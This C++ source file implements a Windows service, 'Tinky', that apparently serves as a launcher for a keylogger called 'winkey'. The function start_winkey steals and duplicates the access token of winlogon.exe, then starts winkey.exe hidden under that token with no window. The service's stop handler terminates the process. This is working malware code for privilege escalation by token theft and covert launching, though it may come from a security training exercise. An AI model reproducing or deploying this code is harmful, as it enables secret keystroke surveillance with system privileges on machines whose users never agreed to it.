#include "Tinky.hpp"


SERVICE_STATUS_HANDLE	__hServiceStatusHandle;
SERVICE_STATUS			__ServiceStatus;
HANDLE                  __serviceStopEvent;
HANDLE					__winkeyPrimaryToken;

DWORD	getPidByProcName(char* filename)
{
	BOOL				__processEntryStatus;
	HANDLE				__hSnapShot;
	PROCESSENTRY32		__processEntry;

	/* akes a snapshot of the specified processes, as well as the heaps, modules, and threads used by these processes. */
	__hSnapShot = CreateToolhelp32Snapshot(
		TH32CS_SNAPALL,
		NULL
	);

	__processEntry.dwSize = sizeof(PROCESSENTRY32);

	/* Retrieves information about the first process encountered in a system snapshot. */
	__processEntryStatus = Process32First(
		__hSnapShot,
		&__processEntry
	);
	
	/*
		if the first entry of the process list has been copied to the buffer.
		Loop over all processes. and search for the specified process.
	*/
	while (__processEntryStatus)
	{
		/* If specified process found, return its pid. */
		if (strncmp(__processEntry.szExeFile, filename, strlen(filename)) == 0)
		{
			CloseHandle(
				__hSnapShot
			);
			return (__processEntry.th32ProcessID);
		}
		__processEntryStatus = Process32Next(
			__hSnapShot,
			&__processEntry
		);
	}

	CloseHandle(
		__hSnapShot
	);
	return (0);
}

/*  Sets the current service status and reports it to the SCM. */
void ReportSvcStatus(DWORD state, DWORD Q_ERROR)
{
	BOOL	__setServiceStatus;

	/* TO-DO: Contains status information for a service. */
	__ServiceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
	__ServiceStatus.dwControlsAccepted = 0;
	if (state != SERVICE_START_PENDING) {
		__ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
	}
	__ServiceStatus.dwCurrentState = state;
	__ServiceStatus.dwWin32ExitCode = Q_ERROR;
	__ServiceStatus.dwServiceSpecificExitCode = 0;
	__ServiceStatus.dwCheckPoint = 0;

	/* TO-DO: Updates the service control manager's status information for the calling service.*/
	__setServiceStatus = SetServiceStatus(
		__hServiceStatusHandle,
		&__ServiceStatus
	);

	if (!__setServiceStatus)
		return;
	return;
}


VOID	kill_winky(void)
{
	DWORD	__winkeyPID;
	HANDLE	__hWinkeyProcess;
	BOOL	__terminateProcessStatus;

	/* TO-DO: open process by pid and terminate it */
	__winkeyPID = getPidByProcName(WINKEY_EXEC);

	__hWinkeyProcess = OpenProcess(
		PROCESS_TERMINATE,
		NULL,
		__winkeyPID
	);

	__terminateProcessStatus = TerminateProcess(
		__hWinkeyProcess,
		1
	);

	CloseHandle(__hWinkeyProcess);
	return;
}

void WINAPI LServiceProcessHandler(
	DWORD dwControl
)
{
	// Handle the requested control code. 
	BOOL __setEventStatus;

	switch (dwControl)
	{
		case SERVICE_CONTROL_STOP:
			ReportSvcStatus(SERVICE_STOP_PENDING, NO_ERROR);

			/* Stops/kill our winkey process */
			kill_winky();
			/* Signal the service to stop. */

			__setEventStatus = SetEvent(__serviceStopEvent);
			ReportSvcStatus(__ServiceStatus.dwCurrentState, NO_ERROR);

			return;
		default:
			break;
	}
}


VOID	start_winkey()
{
	//char					__WinkeyFullPath[260];
	BOOL					__openProcessTokenStatus;
	BOOL					__duplicateTokenStatus;
	BOOL					__createProcessAsUserStatus;
	DWORD					__winLogonPID;
	HANDLE					__hWinLogonProcess;
	HANDLE					__hWinLoginToken;
	STARTUPINFO				__startUpInfo;
	PROCESS_INFORMATION		__winkeyProcessInfo;
	/**
	* Retrieves the fully qualified path for the file that contains the specified module.
	* The module must have been loaded by the current process.
	*/

	//if (!GetCurrentDirectory(260, __WinkeyFullPath))
	//	return ;

	//strcat_s(__WinkeyFullPath, "\\winkey.exe");
	char* deb = WINKEY_PATH;
	LPCSTR __WinkeyFullPath = deb;
	ZeroMemory(&__startUpInfo, sizeof(__startUpInfo));
	__startUpInfo.cb = sizeof(__startUpInfo);


	__winLogonPID = getPidByProcName("winlogon.exe");

	/* Opens a winlogon local process object. */

	__hWinLogonProcess =  OpenProcess(
		PROCESS_QUERY_INFORMATION,
		0,
		__winLogonPID
	);

	if (__hWinLogonProcess == NULL)
		return;

	/* Opens the access token associated with winlogon process. */
	__openProcessTokenStatus = OpenProcessToken(
		__hWinLogonProcess,
		TOKEN_DUPLICATE,
		&__hWinLoginToken
	);

	CloseHandle(__hWinLogonProcess);
	
	if (__openProcessTokenStatus == NULL)
		return;

	__duplicateTokenStatus = DuplicateTokenEx(
		__hWinLoginToken,
		TOKEN_ALL_ACCESS,
		NULL,
		SecurityDelegation,
		TokenPrimary,
		&__winkeyPrimaryToken
	);

	CloseHandle(__hWinLoginToken);
	if (!__duplicateTokenStatus)
	{
		std::cerr << "(-) failed to duplicate token." << std::endl;
		return;
	}

	/* Creates a new process and its primary thread. The new process runs in the security context of the user represented by the specified token. */
	__createProcessAsUserStatus = CreateProcessAsUserA(
		__winkeyPrimaryToken,
		__WinkeyFullPath,
		NULL,
		NULL,
		NULL,
		FALSE,
		CREATE_NO_WINDOW,
		NULL,
		NULL,
		&__startUpInfo,
		&__winkeyProcessInfo
	);

	if (!__createProcessAsUserStatus)
	{
		std::cerr << "(-) failed to create process." << std::endl;
		return;
	}
}

VOID SvcInit(DWORD dwArgc, LPTSTR* lpszArgv)
{
	/**
	* TO_DO: Declare and set any required variables.
	* Be sure to periodically call ReportSvcStatus() with 
	* SERVICE_START_PENDING. If initialization fails, call
	* ReportSvcStatus with SERVICE_STOPPED.
	*/

	(void)dwArgc;
	(void)lpszArgv;
	/* Create an event.The control handler function, LServiceProcessHandler */
	/* signals this event when it receives the stop control code. */
	__serviceStopEvent =  CreateEvent(
		NULL,
		TRUE,
		FALSE,
		NULL
	);

	if (__serviceStopEvent == NULL)
	{
		ReportSvcStatus(SERVICE_STOPPED, GetLastError());
		return;
	}

	/* Report running status when initialization is complete. */
	ReportSvcStatus(SERVICE_RUNNING, NO_ERROR);

	/* Starting winky background process. */
	start_winkey();

	/* Check whether to stop the service. */
	WaitForSingleObject(__serviceStopEvent, INFINITE);
	ReportSvcStatus(SERVICE_STOPPED, NOERROR);

	return;
}

VOID WINAPI ServiceMain(DWORD dwArgc, LPTSTR* lpszArgv)
{
	__hServiceStatusHandle = RegisterServiceCtrlHandler(
		SVCNAME,
		LServiceProcessHandler
	);

	if (__hServiceStatusHandle == NULL)
	{
		std::cerr << "(-) failed register service control handler to SCManager." << std::endl;
		return;
	}

	/* Report initial status to the SCM */
	ReportSvcStatus(SERVICE_START_PENDING, NO_ERROR);

	/* Perform service - specific initialization and work. */
	SvcInit(dwArgc, lpszArgv);
}

BOOL	_processEntryPoint(void)
{
	/** Entry point for the service process **/
	BOOL	__serviceDispatcherStatus;


	// TO_DO: Add any additional services for the process to this table.
	SERVICE_TABLE_ENTRY __serviceDispatcherEntryTable[] =
	{
		{
			SVCNAME, 
			(LPSERVICE_MAIN_FUNCTION)ServiceMain
		},
		{
			NULL,
			NULL 
		}
	};

	// This call returns when the service has stopped. 
	// The process should simply terminate when the call returns.
	__serviceDispatcherStatus = StartServiceCtrlDispatcher(__serviceDispatcherEntryTable);
	if (!__serviceDispatcherEntryTable)
	{
		//SvcReportEvent(TEXT("StartServiceCtrlDispatcher"));
		return (false);
	}

	return (true);
}

void	show_usage(char* command)
{
	std::cout << "Invalid command: " << command << std::endl;
	std::cout << "svc.exe [install/start/stop/delete/update]" << std::endl;
	
	return;
}

int     main(int argc, char** argv)
{
	BOOL	__entryPointStatus;

	/** Entry point for the service process **/
	if (argc < 2)
	{
		__entryPointStatus = _processEntryPoint();
		if (!__entryPointStatus)
			return (false);
	}
	else
	{
		Tinky	__tinkyService(SVCNAME);
		BOOL	__commandStatus;

		const char* commands[] = { "install", "start", "stop", "delete", "update"};

		// Define an array of function pointers
		bool (Tinky:: * serviceFunctions[])() = {
			&(Tinky::createService),
			&(Tinky::startService),
			&(Tinky::stopService),
			&(Tinky::deleteService),
			&(Tinky::updateService)
		};

		for (int i = 0; i < sizeof(commands) / sizeof(commands[0]); ++i) {
			if (strcmp(argv[1], commands[i]) == 0) {
				__commandStatus = (__tinkyService.*serviceFunctions[i])();
				if (__commandStatus) {
					std::cout << "Service {tinky} " << argv[1] << "ed successfully." << std::endl;
					return (0);
				}
				else
					return (1);
			}
		}
		show_usage(argv[1]);
	}
	return (0);
}